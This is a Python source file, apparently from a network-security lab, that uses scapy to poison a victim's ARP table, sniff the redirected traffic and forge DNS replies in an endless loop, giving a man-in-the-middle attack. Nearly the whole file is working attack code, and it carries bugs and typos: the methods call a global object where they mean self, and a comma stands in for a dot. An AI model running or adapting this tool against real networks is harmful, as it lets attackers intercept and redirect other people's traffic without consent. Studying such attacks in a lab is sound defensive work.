from time import sleep

from scapy.all import *
from scapy.layers.inet import IP, TCP
import threading
from threading import Lock
import arpSpoof
import util
import interceptor
import dnsSpoofing

lock = Lock()
networkInterface = "enp0s3"
victimIP = "192.168.56.101"
#victimMAC = "08:00:27:b0:a1:ab"

spoofIP = "192.168.56.102"
#serverMAC = "08:00:27:c6:a4:61"



# input : attacker MAC as str
# -target ip which has posioned arp tables  as str
# - array of ips which were posioned in victim table as array of str
# - network interface as str
# output:
# - send replay packet which will perform MIMA as follows
# - attacker will receive request from victim ip
# - performe that request and receive response from dst ip
# - and then send that resposne to the victim ip

class sniffer():
    def __init__(self, networkInterface, victimIP, spoofIP, attackerMAC):
        self.networkInterface = networkInterface
        self.victimIP = victimIP
        self.spoofIP = spoofIP
        self.attackerMAC = attackerMAC
        self.victimMAC = util.getMAC(victimIP, networkInterface) # get victim MAC adress
        self.serverMAC = [util.getMAC(ip, networkInterface) for ip in spoofIP]  # get array of MAC of poisoned ips in victim arp table
        self.interceptedPkt = []

    def startSniffArp(self):
        sniff(prn=self.interceptARP, iface=networkInterface, filter="ip", timeout = 20)

    def startSniffDNS(self):
        sniff(filter="udp port 53", iface=networkInterface, prn=self.interceptDNS, store=0, timeout = 20)

    def interceptARP(self, pkt):
         interceptor.interceptARP(pkt, self.interceptedPkt, self.attackerMAC, self.spoofIP, self.serverMAC, self.victimMAC, self.networkInterface)

    def dnsResponse(self, pkt, hostIP, mac):
        dnsSpoofing.dns_call(pkt, hostIP, mac, self,networkInterface, self.attackerMAC)

    def interceptDNS(self, pkt):
        pkt, hostIP, mac =interceptor.interceprDNS(pkt, self.networkInterface)
        self.dnsResponse(pkt, hostIP, mac)

    def spoofARP(self):
        arpSpoof.arpPoisoning(self.victimIP, self.spoofIP, self.networkInterface)



    def startARP(self):
        while (True):
            test.spoofARP()
            test.startSniffArp()

    def startDNS(self):
        while (True):
            test.spoofARP()
            test.startSniffDNS()
test = sniffer(networkInterface, [victimIP], [spoofIP], get_if_hwaddr(networkInterface))

test.startDNS()
